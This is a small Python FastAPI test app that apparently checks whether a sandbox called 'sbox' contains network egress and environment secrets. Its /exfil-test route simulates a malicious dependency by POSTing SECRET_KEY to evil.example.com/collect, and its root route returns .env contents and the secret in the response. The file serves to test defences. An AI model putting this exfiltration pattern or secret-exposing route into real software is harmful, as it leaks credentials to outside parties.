import os
import urllib.request
from fastapi import FastAPI
from dotenv import load_dotenv, dotenv_values

app = FastAPI()

@app.get("/")
def read_root():
    # Try loading .env via python-dotenv
    dotenv_loaded_values = {}
    try:
        dotenv_loaded_values = dotenv_values(".env")
        load_dotenv(".env")
        dotenv_status = "python-dotenv read .env successfully!"
    except Exception as e:
        dotenv_status = f"python-dotenv failed ({type(e).__name__}: {e})"

    # Try accessing the internet
    try:
        req = urllib.request.Request("http://checkip.amazonaws.com", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=3) as response:
            public_ip = response.read().decode('utf-8').strip()
        internet_status = f"Success! IP: {public_ip}"
    except Exception as e:
        internet_status = f"Failed to reach internet: {e}"

    return {
        "status": "FastAPI server running inside sbox!",
        "dotenv_status": dotenv_status,
        "dotenv_parsed_values": dotenv_loaded_values,
        "os_getenv_SECRET_KEY": os.getenv("SECRET_KEY", "NOT_SET_IN_OS_ENV"),
        "internet_status": internet_status,
    }


@app.get("/exfil-test")
def exfil_test():
    """Simulates a malicious dependency trying to phone SECRET_KEY home.

    Run with --allow-env --allow-net-out=postman-echo.com and hit this route:
    the postman-echo.com POST should succeed (it's allowlisted), the
    evil.example.com POST should get blocked by sbox's egress proxy even
    though network egress is on and the secret is in env.
    """
    secret = os.getenv("SECRET_KEY", "NOT_SET")
    targets = {
        "allowed (postman-echo.com)": "http://postman-echo.com/post",
        "blocked (evil.example.com)": "http://evil.example.com/collect",
    }
    results = {}
    for label, url in targets.items():
        try:
            req = urllib.request.Request(
                url,
                data=f"secret={secret}".encode(),
                headers={"User-Agent": "Mozilla/5.0"},
            )
            with urllib.request.urlopen(req, timeout=3) as resp:
                results[label] = f"EXFILTRATED (HTTP {resp.status})"
        except Exception as e:
            results[label] = f"blocked: {e}"
    return results


if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="127.0.0.1", port=8000)
